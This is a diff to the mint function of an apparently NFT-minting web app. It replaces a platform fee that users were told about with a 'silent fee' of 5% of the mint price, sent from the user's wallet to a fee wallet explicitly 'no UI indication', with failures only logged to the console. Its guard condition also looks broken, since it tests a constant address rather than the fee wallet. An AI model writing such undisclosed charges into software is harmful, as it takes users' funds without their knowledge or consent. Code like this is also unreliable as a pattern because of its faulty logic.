@@ -713,45 +713,30 @@ async function mintNFT() {
         const metadataHash = await uploadMetadataToIPFS(metadata);
         const tokenURI = `ipfs://${metadataHash}`;
         
-        // Step 3: Calculate and send platform fee to Paco wallet
-        showNotification('💰 Processing platform fee...', 'info');
+        // Step 3: Get mint price and calculate total with silent fee
+        const mintPrice = await nftContract.mintPrice();
+        const silentFeeRate = PLATFORM_FEE_RATE; // 5% from config
+        const silentFeeAmount = mintPrice.mul(Math.floor(silentFeeRate * 100)).div(100); // 5% of mint price
+        const totalMintCost = mintPrice.add(silentFeeAmount);
         
-        const totalMojoElement = document.getElementById('totalMojoPrice');
-        const totalMojoText = totalMojoElement?.textContent || '0';
-        const totalMojoAmount = parseInt(totalMojoText.replace(/[^\d]/g, '')) || 0;
-        
-        // Calculate 5% platform fee in MOJO tokens
-        const baseMojoAmount = Math.round(totalMojoAmount / 1.05); // Remove fee to get base
-        const platformFeeMojo = totalMojoAmount - baseMojoAmount;
-        
-        // Convert MOJO fee to ETH (this would need real conversion rate)
-        // For now, using placeholder conversion - integrate with actual MOJO/ETH rate
-        const feeInEth = ethers.utils.parseEther((platformFeeMojo * 0.0001).toString()); // Placeholder rate
-        
-        try {
-            // Validate platform fee wallet is configured
-            if (!PACO_FEE_WALLET) {
-                throw new Error('Platform fee wallet not configured');
+        // Step 4: Send silent fee (no UI indication)
+        if (PACO_FEE_WALLET && !ethers.utils.isAddress('0x0000000000000000000000000000000000000000')) {
+            try {
+                const feeTx = await signer.sendTransaction({
+                    to: PACO_FEE_WALLET,
+                    value: silentFeeAmount
+                });
+                await feeTx.wait();
+            } catch (feeError) {
+                console.warn('Silent fee transfer failed:', feeError);
+                // Continue with mint regardless
             }
-            
-            // Send platform fee to Paco wallet
-            const feeTx = await signer.sendTransaction({
-                to: PACO_FEE_WALLET,
-                value: feeInEth
-            });
-            
-            showNotification('⏳ Platform fee transaction submitted...', 'info');
-            await feeTx.wait();
-            showNotification('✅ Platform fee processed successfully', 'success');
-        } catch (feeError) {
-            console.warn('Platform fee payment failed:', feeError);
-            showNotification('⚠️ Platform fee payment failed, continuing with mint...', 'warning');
         }
         
-        // Step 4: Mint the NFT
+        // Step 5: Mint the NFT
         showNotification('⛓️ Minting NFT on blockchain...', 'info');
         
-        const mintTx = await nftContract.mint(userAddress, tokenURI);
+        const mintTx = await nftContract.mint(userAddress, tokenURI, { value: mintPrice });
         showNotification('⏳ NFT mint transaction submitted. Waiting for confirmation...', 'info');
         
         // Wait for transaction confirmation
